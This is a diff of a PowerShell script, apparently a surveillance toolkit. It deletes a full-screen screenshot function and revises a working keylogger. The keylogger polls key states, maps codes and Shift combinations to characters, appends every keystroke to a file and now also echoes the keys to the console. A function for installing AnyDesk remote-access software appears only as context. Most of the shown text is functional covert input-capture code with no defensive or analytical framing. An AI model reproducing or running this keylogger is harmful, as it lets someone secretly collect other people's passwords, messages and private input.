@@ -10,41 +10,6 @@
     
 }
 
-function Invoke-Screenshot {
-
-    Param(
-        [Parameter(Mandatory = $true)][string]$Path
-    )
-
-    try {
-        $FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
-        $File = Join-Path $Path $FileName
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-
-        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $Width = $Screen.Width
-        $Height = $Screen.Height
-        $Left = $Screen.Left
-        $Top = $Screen.Top
-
-        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-
-        $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
-        Write-Output "Screenshot saved to: $File"
-    }
-    catch {
-        Write-Error "Failed to save screenshot. Error: $_"
-    }
-    finally {
-        
-        if ($graphic) { $graphic.Dispose() }
-        if ($bitmap) { $bitmap.Dispose() }
-    }
-}
-
 function Invoke-KeyStrokeCapture {
 
     param(
@@ -60,9 +25,7 @@ function Invoke-KeyStrokeCapture {
 
     $null = New-Item -Path $OutputPath -ItemType File -Force
 
-
     $endTime = (Get-Date).AddSeconds($DurationInSeconds)
-
 
     $keyCodes = @{
         8 = "`b"        # Backspace
@@ -97,7 +60,6 @@ function Invoke-KeyStrokeCapture {
         40 = "DOWN" # Down Arrow
     }
 
-
     $previousState = @{}
     $modifiers = @{
         16 = $false # Left Shift
@@ -106,12 +68,10 @@ function Invoke-KeyStrokeCapture {
         18 = $false # Alt
     }
 
-
     function Get-Character {
         param (
             [int]$keyCode
         )
-
 
         if ($modifiers[16] -or $modifiers[160]) {
             if ($shiftKeyMapping.ContainsKey($keyCode)) {
@@ -119,18 +79,18 @@ function Invoke-KeyStrokeCapture {
             }
         }
 
-
         if ($keyCode -ge 32 -and $keyCode -le 126) {
             return [char]$keyCode
         }
-
 
         if ($nonPrintableKeys.ContainsKey($keyCode)) {
             return $nonPrintableKeys[$keyCode]
         }
 
-        return "`n" 
+        return "" 
     }
+
+    Write-Host -NoNewline "Capturing keystrokes: "
 
     while ((Get-Date) -lt $endTime) {
         Start-Sleep -Milliseconds 50
@@ -140,18 +100,18 @@ function Invoke-KeyStrokeCapture {
             $isPressed = ($keyState -band 0x8000) -ne 0
 
             if ($keyCode -eq 16 -or $keyCode -eq 160) {
-
                 $modifiers[$keyCode] = $isPressed
             } elseif ($keyCode -eq 17 -or $keyCode -eq 18) {
-
                 $modifiers[$keyCode] = $isPressed
             } elseif ($isPressed -and (-not $previousState[$keyCode])) {
- 
-                [System.IO.File]::AppendAllText($OutputPath, (Get-Character -keyCode $keyCode), [System.Text.Encoding]::ASCII)
+                $character = Get-Character -keyCode $keyCode
+                [System.IO.File]::AppendAllText($OutputPath, $character, [System.Text.Encoding]::ASCII)
+
+                # Append the keystroke to the same line in the console
+                Write-Host -NoNewline $character
 
                 $previousState[$keyCode] = $true
             } elseif (-not $isPressed) {
-
                 if ($previousState.ContainsKey($keyCode)) {
                     $previousState.Remove($keyCode)
                 }
@@ -159,7 +119,7 @@ function Invoke-KeyStrokeCapture {
         }
     }
 
-    Write-Host "Keystroke logging completed. Output saved to $OutputPath"
+    Write-Host "`nKeystroke logging completed. Output saved to $OutputPath"
 }
 
 function Invoke-AnyDeskInstall {
